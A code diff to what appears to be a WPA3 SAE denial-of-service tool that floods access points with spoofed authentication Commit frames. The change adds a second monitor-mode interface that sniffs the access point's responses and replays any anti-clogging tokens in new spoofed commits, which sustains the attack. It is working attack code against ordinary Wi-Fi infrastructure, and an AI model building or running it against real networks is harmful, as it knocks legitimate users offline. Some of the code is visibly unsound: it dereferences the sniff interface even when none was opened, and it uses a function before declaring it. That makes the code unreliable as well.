@@ -82,6 +82,7 @@ size_t AUTH_REQ_SAE_COMMIT_HEADER_SIZE = sizeof(AUTH_REQ_SAE_COMMIT_HEADER) - 1;
 static struct state
 {
 	struct wif *wi;
+	struct wif *sniff_wi;
 	unsigned char bssid[6];
 	unsigned char srcaddr[6];
 	int debug_level;
@@ -290,6 +291,12 @@ open_card(struct state *state, char * dev, int chan)
 	debug(state, 0, "Setting to channel %d\n", chan);
 	if (card_set_chan(state, chan) == -1) err(1, "card_set_chan()");
 }
+
+static void open_sniff_card(struct state *state, char *dev) {
+    state->sniff_wi = wi_open(dev);
+    if (!state->sniff_wi) err(1, "wi_open() sniff card");
+}
+
 
 int bignum2bin(BIGNUM *num, uint8_t *buf, size_t outlen)
 {
@@ -566,10 +573,13 @@ void detect_hostapd_queuing(struct state *state)
 	}
 }
 
-static void event_loop(struct state *state, char * dev, int chan)
+static void event_loop(struct state *state, char *dev, int chan, char *sniff_device)
 {
 	// Step 1 -- Initialize Wi-Fi interface
 	open_card(state, dev, chan);
+	if (sniff_device != NULL)
+		open_sniff_card(state, sniff_device);
+
 	if (state->injection_bitrate && card_set_rate(state, state->injection_bitrate))
 		debug(state, 0, "Warning: failed to set injection bitrate to %d\n", state->injection_bitrate);
 
@@ -607,24 +617,30 @@ static void event_loop(struct state *state, char * dev, int chan)
 
 	while (1)
 	{
-		struct pollfd fds[3];
-		int card_fd = wi_fd(state->wi);
-
+		struct pollfd fds[4];
+		int inject_fd = wi_fd(state->wi);
+		int sniff_fd = wi_fd(state->sniff_wi);
+	
 		memset(&fds, 0, sizeof(fds));
-		fds[0].fd = card_fd;
+		fds[0].fd = sniff_fd;
 		fds[0].events = POLLIN;
-		fds[1].fd = state->time_fd_inject;
+		fds[1].fd = inject_fd;
 		fds[1].events = POLLIN;
-		fds[2].fd = state->time_fd_status;
+		fds[2].fd = state->time_fd_inject;
 		fds[2].events = POLLIN;
+		fds[3].fd = state->time_fd_status;
+		fds[3].events = POLLIN;
 
-		if (poll(fds, 3, -1) == -1)
+		if (poll(fds, 4, -1) == -1)
 			err(1, "poll()");
 
 		if (fds[0].revents & POLLIN)
+			sniff_receive(state);
+
+		if (fds[1].revents & POLLIN)
 			card_receive(state);
 
-		if (fds[1].revents & POLLIN) {
+		if (fds[2].revents & POLLIN) {
 			uint64_t exp;
 			int UNUSED_VARIABLE rval;
 
@@ -632,7 +648,7 @@ static void event_loop(struct state *state, char * dev, int chan)
 			inject_commits(state);
 		}
 
-		if (fds[2].revents & POLLIN) {
+		if (fds[3].revents & POLLIN) {
 			uint64_t exp;
 			int UNUSED_VARIABLE rval;
 
@@ -698,6 +714,7 @@ static void usage(char * p)
 		   "       -m         : Inject a malfored Commit after every spoofed one\n"
 		   "       -M         : Detect and abuse hostapd's queuing behaviour\n"
 		   "       -f         : Don't scan for the AP\n"
+		   "       -s iface   : Second interface for sniffing AP responses (in monitor mode)\n"
 		   "\n",
 		   version_info);
 	free(version_info);
@@ -800,6 +817,7 @@ int initialize_crypto_context(struct state *state)
 
 int main(int argc, char * argv[])
 {
+	char *sniff_device = NULL;
 	char * device = NULL;
 	int ch;
 	int chan = 1;
@@ -815,7 +833,7 @@ int main(int argc, char * argv[])
 	state->frames_per_burst = 1;
 	state->numclients = 256;
 
-	while ((ch = getopt(argc, argv, "d:v:c:a:g:r:b:n:i:mM:hf")) != -1)
+	while ((ch = getopt(argc, argv, "d:v:c:a:g:r:b:n:i:mM:fs:h")) != -1)
 	{
 		switch (ch)
 		{
@@ -903,7 +921,9 @@ int main(int argc, char * argv[])
 			case 'f':
 				state->force_attack = 1;
 				break;
-
+			case 's':
+				sniff_device = optarg;
+				break;
 			case 'h':
 			default:
 				usage(argv[0]);
@@ -956,6 +976,45 @@ int main(int argc, char * argv[])
 		return 1;
 	}
 
-	event_loop(state, device, chan);
+	event_loop(state, device, chan, sniff_device);
 	exit(0);
+}
+
+static void process_sniffed_packet(struct state *state, unsigned char *buf, int len) {
+    int pos_bssid, pos_src, pos_dst;
+    if (buf[1] & 0x08) return;
+
+    switch (buf[1] & 3) {
+        case 0: pos_bssid = 16; pos_src = 10; pos_dst = 4; break;
+        case 1: pos_bssid = 4;  pos_src = 10; pos_dst = 16; break;
+        case 2: pos_bssid = 10; pos_src = 16; pos_dst = 4; break;
+        default: pos_bssid = 10; pos_src = 24; pos_dst = 16; break;
+    }
+
+    if (memcmp(buf + pos_bssid, state->bssid, 6) != 0) return;
+
+    unsigned char *dst = buf + pos_dst;
+    if (memcmp(dst, state->srcaddr, 5) != 0) return;
+    if (dst[5] >= state->numclients) return;
+
+    if (len > 32 && buf[0] == 0xb0 && buf[24] == 0x03 && buf[26] == 0x01) {
+        if (buf[28] == 0x4C) {
+            unsigned char *token = buf + 32;
+            int token_len = len - 32;
+            state->rx_clogging_token++;
+            inject_sae_commit(state, dst, token, token_len);
+        } else if (buf[28] == 0x00) {
+            state->rx_commits_ring[state->rx_commits_idx]++;
+        }
+    }
+}
+
+static int sniff_receive(struct state *state) {
+    unsigned char buf[2048];
+    int len;
+    struct rx_info ri;
+    len = wi_read(state->sniff_wi, buf, sizeof(buf), &ri);
+    if (len < 0) return -1;
+    process_sniffed_packet(state, buf, len);
+    return len;
 }
